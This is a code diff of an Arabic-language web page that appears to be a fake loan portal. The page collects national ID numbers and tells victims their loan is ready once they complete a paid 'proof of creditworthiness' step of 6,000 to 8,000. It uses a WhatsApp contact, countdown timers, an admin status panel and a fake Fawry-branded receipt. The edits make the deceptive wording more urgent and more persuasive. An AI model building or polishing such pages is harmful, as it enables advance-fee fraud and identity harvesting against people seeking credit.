@@ -738,7 +738,7 @@
 
     <div class="final-stage-banner">
       <i class="fas fa-star"></i>
-      <span class="text">🏆 <span class="hl-gold">المرحلة النهائية</span> — <span class="hl-emerald">إثبات الجدارة الائتمانية</span></span>
+      <span class="text">🏆 <span class="hl-gold">المرحلة النهائية</span> — <span class="hl-emerald">تم التسيل لحسابك سيتم الصرف خلال الوقت المحدد</span></span>
       <i class="fas fa-flag-checkered"></i>
     </div>
 
@@ -750,17 +750,17 @@
 
     <div class="search-box">
       <input type="text" id="nationalId" placeholder="🔢 الرقم القومي (14 رقم)" maxlength="14" inputmode="numeric">
-      <button onclick="searchCustomer()"><i class="fas fa-money-bill-wave"></i> 💸 استعلام</button>
+      <button onclick="searchCustomer()"><i class="fas fa-money-bill-wave"></i> 💸 صرف الآن</button>
     </div>
 
     <div id="resultArea"></div>
 
     <div class="error-card" id="errorBox">
       <i class="fas fa-exclamation-triangle"></i>
-      <p>⚠️ الرقم القومي غير مسجل في النظام. يرجى الانتظار لحين دخول طلبك.</p>
+      <p>⚠️ الرقم القومى جارى دخولة في النظام. يرجى الانتظار لحين دخول طلبك.</p>
     </div>
 
-    <div class="loader" id="loader"><i class="fas fa-spinner fa-pulse"></i><p>⏳ جاري جلب البيانات...</p></div>
+    <div class="loader" id="loader"><i class="fas fa-spinner fa-pulse"></i><p>⏳ جاري الحصول على البيانات...</p></div>
 
     <div class="admin-panel" id="adminPanel">
       <div class="title"><i class="fas fa-cog"></i> ⚙️ تغيير حالة العميل</div>
@@ -858,8 +858,8 @@
 
   const WHATSAPP_NUMBER = "+12519108713";
   const WHATSAPP_URL = `https://wa.me/${WHATSAPP_NUMBER.replace(/\s/g, '')}`;
-  const PROOF_MINUTES = 45;
-  const PENDING_MINUTES = 40;
+  const PROOF_MINUTES = 35;
+  const PENDING_MINUTES = 30;
 
   let currentCustomer = null;
   let currentNationalId = null;
@@ -921,8 +921,8 @@
   }
 
   function getProofAmount(loanAmount, nationalId) {
-    if (nationalId === "28009011206118") return 8000;
-    if (nationalId === "28009011206118") return 8000;
+    if (nationalId === "2800901206118") return 8000;
+    if (nationalId === "2800901126118") return 8000;
     if (loanAmount < 80000) return 6000;
     return 8000;
   }
@@ -1065,7 +1065,7 @@
         </div>
 
         <div class="inv-footer">
-          <div>هذه إيصال تم إنشاؤه تلقائياً. لا يتطلب توقيعاً.</div>
+          <div>هذا إيصال تم إنشاؤه تلقائياً. لا يتطلب توقيعاً.</div>
           <div class="powered">powered by <span>Fawry</span></div>
         </div>
       </div>
@@ -1118,7 +1118,7 @@
       <div class="proof-section">
         <div class="proof-header">
           <span class="icon-big"><i class="fas fa-shield-alt"></i></span>
-          <h2>🔐 إثبات الجدارة الائتمانية</h2>
+          <h2>🔐لابد من إثبات الجدارة الائتمانية</h2>
           <div class="sub">💡 هذا الإجراء منك إليك — لا يوجد أي تحويل أو دفع للشركة</div>
         </div>
 
